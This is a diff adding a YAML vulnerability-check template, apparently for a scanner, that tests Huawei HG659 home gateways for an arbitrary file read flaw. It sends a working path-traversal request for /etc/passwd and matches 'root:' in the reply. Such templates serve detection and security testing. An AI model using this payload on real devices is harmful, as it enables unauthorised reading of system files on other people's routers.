@@ -1,0 +1,21 @@
+id: poc-yaml-huawei-home-gateway-hg659-arbitrary-file-read
+info:
+  name: 华为HG659任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: Huawei
+  osprey-id: vb_2021_0048
+requests:
+- method: GET
+  path: /lib///....//....//....//....//....//....//....//....//etc//passwd
+  headers:
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:86.0) Gecko/20100101
+      Firefox/86.0
+    Content-Type: application/x-www-form-urlencoded
+  expression: 'status_code == 200 && contains(body, "root:") && !contains(body, "<")
+    && contains(body, "/bin")
+
+    '
+variables: {}
+transport: http
